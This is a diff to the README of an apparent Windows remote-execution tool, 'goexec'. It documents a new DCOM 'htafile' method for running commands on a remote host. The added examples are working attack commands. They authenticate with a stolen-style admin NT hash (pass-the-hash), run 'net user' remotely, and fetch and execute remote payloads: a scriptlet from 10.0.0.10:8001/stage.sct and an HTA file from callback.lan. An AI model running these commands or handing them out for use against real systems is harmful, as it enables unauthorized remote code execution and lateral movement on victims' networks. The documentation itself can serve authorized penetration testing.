@@ -207,6 +207,7 @@ Available Commands:
   mmc                Execute with the MMC20.Application DCOM object
   shellwindows       Execute with the ShellWindows DCOM object
   shellbrowserwindow Execute with the ShellBrowserWindow DCOM object
+  htafile            Execute with the HTAFile DCOM object
 
 ... [inherited flags] ...
 
@@ -333,6 +334,53 @@ goexec dcom shellbrowserwindow "$target" \
   -e 'explorer.exe' \
   --app-window 3
 ```
+
+#### `htafile` Method (`dcom htafile`)
+
+The `htafile` method uses the exposed HTML Application object to call [`IPersistMoniker.Load`](https://learn.microsoft.com/en-us/previous-versions/aa458529(v=msdn.10)) with a client-supplied [URL moniker](https://learn.microsoft.com/en-us/openspecs/office_file_formats/ms-oshared/4948a119-c4e4-46b6-9609-0525118552e8). The URL can point to a URL of any format supported by `mshta.exe`.
+
+```text
+Usage:
+  goexec dcom htafile [target] [flags]
+
+Execution:
+  -U, --url URL                Load custom URL
+      --js string              Execute JavaScript one-liner
+      --vbs string             Execute VBScript one-liner
+  -e, --exec executable        Remote Windows executable to invoke
+  -a, --args string            Process command line arguments
+  -c, --command string         Windows process command line (executable & arguments)
+  -o, --out file               Fetch execution output to file or "-" for standard output
+  -m, --out-method string      Method to fetch execution output (default "smb")
+      --out-timeout duration   Output timeout duration (default 1m0s)
+      --no-delete-out          Preserve output file on remote filesystem
+
+... [inherited flags] ...
+```
+
+##### Examples
+
+```shell
+# Execute `net user` + print output
+goexec dcom htafile "$target" \
+  --user "${auth_user}@${domain}" \
+  --password "$auth_pass" \
+  --command 'net user' \
+  --out -
+
+# Execute blind WSH JavaScript one-liner using admin NT hash
+goexec dcom htafile "$target" \
+  --user "${auth_user}@${domain}" \
+  --nt-hash "$auth_nt" \
+  --js 'GetObject("script:http://10.0.0.10:8001/stage.sct").Exec();close()'
+
+# Execute remote HTA file using admin NT hash
+goexec dcom htafile "$target" \
+  --user "${auth_user}@${domain}" \
+  --nt-hash "$auth_nt" \
+  --url "http://callback.lan/payload.hta"
+```
+
 
 ### Task Scheduler Module (`tsch`)
 
